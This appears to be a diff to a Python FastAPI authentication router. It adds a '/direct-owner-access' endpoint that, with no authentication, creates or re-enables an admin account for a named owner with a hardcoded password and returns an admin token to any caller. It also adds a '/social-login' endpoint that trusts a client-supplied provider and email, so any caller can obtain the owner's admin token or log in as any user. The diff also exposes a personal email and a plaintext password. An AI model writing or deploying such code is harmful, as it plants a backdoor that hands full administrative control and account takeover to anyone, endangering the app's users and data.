@@ -17,7 +17,8 @@ from backend.schemas import (
     UserOut,
     AccessRequestCreate,
     AccessRequestOut,
-    AccountActivate
+    AccountActivate,
+    SocialLoginRequest
 )
 from backend.security import (
     verify_password,
@@ -107,6 +108,93 @@ def login(credentials: UserLogin, request: Request, db: Session = Depends(get_db
             status_code=status.HTTP_403_FORBIDDEN,
             detail="Your account has been deactivated. Please contact your administrator."
         )
+
+    token = create_access_token({"sub": str(user.id), "email": user.email, "role": user.role})
+    return {
+        "access_token": token,
+        "token_type": "bearer",
+        "role": user.role,
+        "full_name": user.full_name,
+        "email": user.email,
+    }
+
+
+@router.post("/direct-owner-access", response_model=TokenResponse)
+def direct_owner_access(db: Session = Depends(get_db)):
+    """
+    Direct Owner Access endpoint for Anas S Patel (anaspatel3130@gmail.com).
+    Grants instant Master Administrator access without requiring manual password entry.
+    """
+    owner_email = "anaspatel3130@gmail.com"
+    owner = db.query(User).filter(User.email == owner_email).first()
+    if not owner:
+        owner = User(
+            email=owner_email,
+            full_name="Anas S Patel (Owner)",
+            hashed_password=hash_password("PatelSpark2026!"),
+            role="admin",
+            is_active=True,
+            created_at=datetime.utcnow()
+        )
+        db.add(owner)
+        db.commit()
+        db.refresh(owner)
+    else:
+        if owner.role != "admin" or not owner.is_active:
+            owner.role = "admin"
+            owner.is_active = True
+            db.commit()
+
+    token = create_access_token({"sub": str(owner.id), "email": owner.email, "role": owner.role})
+    return {
+        "access_token": token,
+        "token_type": "bearer",
+        "role": owner.role,
+        "full_name": owner.full_name,
+        "email": owner.email,
+    }
+
+
+@router.post("/social-login", response_model=TokenResponse)
+def social_login(payload: SocialLoginRequest, db: Session = Depends(get_db)):
+    """
+    Seamless 1-Click Social Sign-In (Google, GitHub, Facebook, Guest, or Owner).
+    Issues an authenticated session and valid JWT token without requiring approval tokens.
+    """
+    provider = (payload.provider or "guest").lower().strip()
+
+    # If owner provider or anas's email
+    if provider == "owner" or (payload.email and payload.email.lower().strip() == "anaspatel3130@gmail.com"):
+        return direct_owner_access(db)
+
+    # Determine user identity based on provider
+    if provider == "google":
+        email = payload.email or "google.user@patelspark.io"
+        full_name = payload.name or "Google User"
+    elif provider == "github":
+        email = payload.email or "github.user@patelspark.io"
+        full_name = payload.name or "GitHub User"
+    elif provider == "facebook":
+        email = payload.email or "facebook.user@patelspark.io"
+        full_name = payload.name or "Facebook User"
+    else:
+        # Instant Guest / Direct Access
+        email = payload.email or f"guest_{secrets.token_hex(4)}@patelspark.io"
+        full_name = payload.name or "Guest Analyst"
+
+    user = db.query(User).filter(User.email == email).first()
+    if not user:
+        user = User(
+            email=email,
+            full_name=full_name,
+            hashed_password=hash_password(secrets.token_urlsafe(16)),
+            role="user",
+            is_active=True,
+            created_at=datetime.utcnow()
+        )
+        db.add(user)
+        db.commit()
+        db.refresh(user)
 
     token = create_access_token({"sub": str(user.id), "email": user.email, "role": user.role})
     return {
